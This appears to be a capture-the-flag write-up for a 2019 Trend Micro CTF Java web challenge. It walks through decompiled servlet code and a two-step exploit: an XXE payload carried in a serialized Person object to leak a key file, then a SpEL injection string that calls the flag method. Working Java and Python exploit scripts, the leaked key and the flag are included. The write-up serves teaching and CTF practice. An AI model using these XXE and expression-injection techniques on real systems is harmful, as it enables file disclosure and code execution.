It consists of jail image.
Actually, this challenge is similar to last year challenge.
Previous challenge is vulnerable to deserialization using commons-collection5.
But, this chall allows only `com.trendmicro.Person` to serialize as whitelist.
```java
public class CustomOIS extends ObjectInputStream
{
    private static final String[] whitelist;
    
    static {
        whitelist = new String[] { "com.trendmicro.Person" };
    }
    
    public CustomOIS(final ServletInputStream is) throws IOException {
        super((InputStream)is);
    }
    
    public Class<?> resolveClass(final ObjectStreamClass des) throws IOException, ClassNotFoundException {
        if (!Arrays.asList(CustomOIS.whitelist).contains(des.getName())) {
            throw new ClassNotFoundException("Cannot deserialize " + des.getName());
        }
        return super.resolveClass(des);
    }
}
```
First show the `server.class`.
Here is `Server.class`:
```
@WebServlet({ "/jail" })
public class Server extends HttpServlet
{
    private static final long serialVersionUID = 1L;
    
    protected void doPost(final HttpServletRequest request, final HttpServletResponse response) throws ServletException, IOException {
        try {
            final ServletInputStream is = request.getInputStream();
            final CustomOIS ois = new CustomOIS(is);
            final Person person = (Person)ois.readObject();
            ois.close();
            response.getWriter().append("Sorry " + person.name + ". I cannot let you have the Flag!.");
        }
        catch (Exception e) {
            response.setStatus(500);
            e.printStackTrace(response.getWriter());
        }
    }
}
```
`/jail` is deserialize to request data with `(Person)ois.readObject()`.

Here is `Person.class`:
```
public class Person implements Serializable
{
    public String name;
    private static final long serialVersionUID = -559038737L;
    
    public Person(final String name) {
        this.name = name;
    }
    
    private void readObject(final ObjectInputStream aInputStream) throws ClassNotFoundException, IOException, ParserConfigurationException, SAXException {
        final int paramInt = aInputStream.readInt();
        final byte[] arrayOfByte = new byte[paramInt];
        aInputStream.read(arrayOfByte);
        final ByteArrayInputStream localByteArrayInputStream = new ByteArrayInputStream(arrayOfByte);
        final DocumentBuilderFactory localDocumentBuilderFactory = DocumentBuilderFactory.newInstance();
        localDocumentBuilderFactory.setNamespaceAware(true);
        final DocumentBuilder localDocumentBuilder = localDocumentBuilderFactory.newDocumentBuilder();
        final Document localDocument = localDocumentBuilder.parse(localByteArrayInputStream);
        final NodeList nodeList = localDocument.getElementsByTagName("tag");
        final Node node = nodeList.item(0);
        this.name = node.getTextContent();
    }
}
```
`readObject()` parse to string with `ObjectInputStream`.
Basically `DocumentBuilder` is vulnerable to XXE.
So, we can read arbitrary file.

Next, here is another endpoint named `Office`:
```java
@WebServlet({ "/Office" })
public class Office extends HttpServlet
{
    private static final long serialVersionUID = 1L;
    
    protected void doGet(final HttpServletRequest request, final HttpServletResponse response) throws ServletException, IOException {
        final String nametag = request.getParameter("nametag");
        final String keyParam = request.getParameter("key");
        final String keyFileLocation = "/TMCTF2019/key";
        final String key = readFile(keyFileLocation, StandardCharsets.UTF_8);
        if (key.contentEquals(keyParam)) {
            final ExpressionParser parser = (ExpressionParser)new SpelExpressionParser();
            final String expString = "'" + nametag + "' == 'Marshal'";
            final Expression exp = parser.parseExpression(expString);
            final Boolean isMarshal = (Boolean)exp.getValue();
            if (isMarshal) {
                response.getWriter().append("Welcome Marsal");
            }
            else {
                response.getWriter().append("I am sorry but you cannot see the Marshal");
            }
        }
        else {
            response.getWriter().append("Did you forget your keys Marshal?");
        }
    }
    
    protected void doPost(final HttpServletRequest request, final HttpServletResponse response) throws ServletException, IOException {
        this.doGet(request, response);
    }
    
    static String readFile(final String path, final Charset encoding) throws IOException {
        final byte[] encoded = Files.readAllBytes(Paths.get(path, new String[0]));
        return new String(encoded, encoding);
    }
}
```
Wow, it used `SpEL parse`.
Thanks to `SpEL`, we can triggered SpEL Injection.
Before SpEL Injection, must know `key` located '/TMCTF2019/key'.

Finally `jail/Flag.class`:
```java
package com.trendmicro.jail;


import java.io.Reader;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.Serializable;


public class Flag implements Serializable
{
    static final long serialVersionUID = 6119813099625710381L;
    
    public static void getFlag() throws Exception {
        final ProcessBuilder processBuilder = new ProcessBuilder(new String[0]);
        
        final Process process = processBuilder.start();
        final BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        final String flag = reader.readLine();
        throw new Exception(flag);
    }
}
```
`getFlag()` show flag to me as Exception.

Scenario :
1. Leak `/TMCTF2019/key` using XXE as deserialization at `/jail`.
2. Get flag to execute `getFlag()` using SpEL Injection at `/Office`.

1. Leak Kkey
exp.java:
```java
package com.trendmicro;


import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;


public class exp {
    public static void main(String args[]) throws Exception {
        String path = "exp1.ser";
        FileOutputStream fout = new FileOutputStream(path);
        ObjectOutputStream oos = new ObjectOutputStream(fout);
        Person a = new Person("<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE xxe [<!ENTITY xxe SYSTEM \"
        oos.writeObject(a);
        oos.close();
        FileInputStream fis = new FileInputStream(path);
        CustomOIS ois = new CustomOIS(fis);
        Person person = (Person)ois.readObject();
        System.out.println(person.name);
        ois.close();
    }
}
add `writeObject` Person.java:
public class Person implements Serializable
{
    public String name;
    private static final long serialVersionUID = -559038737L;
    
    public Person(final String name) {
        this.name = name;
    }
    
    private void readObject(final ObjectInputStream aInputStream) throws ClassNotFoundException, IOException, ParserConfigurationException, SAXException {
        ...
    }
    private void writeObject(final ObjectOutputStream aOutputStream) throws ClassNotFoundException, IOException, ParserConfigurationException, SAXException {
        aOutputStream.writeInt(name.length());
        aOutputStream.writeBytes(name);
    }
}
```
Leak `key` using below python code:
```python
import requests

url = 'http://flagmarshal.xyz/'
xml = open('exp/exp1.ser','rb').read()

headers = {'Content-Type': 'application/octet-stream'}
r = requests.post(url+'jail',data=xml,headers=headers)
print r.text
```
key: Fo0lMe0nce5hameOnUFoo1MeUCantGetF0oledAgain

2. Get flag
Try to SpEL Injection.
Caution: this chall denied another class without `com.trendmicro.jail.Flag`.
So, we just execute `getFlag` in `flag.class`.
```python
import requests


url = 'http://flagmarshal.xyz/'
data = {
    "key":"Fo0lMe0nce5hameOnUFoo1MeUCantGetF0oledAgain",
    "nametag":"'+T(com.trendmicro.jail.Flag).getFlag()+'"
}
r = requests.post(url+'Office',data=data)
print r.content
```

**FLAG:** TMCTF{F0OlLM3TwIcE1Th@Tz!N1C3}
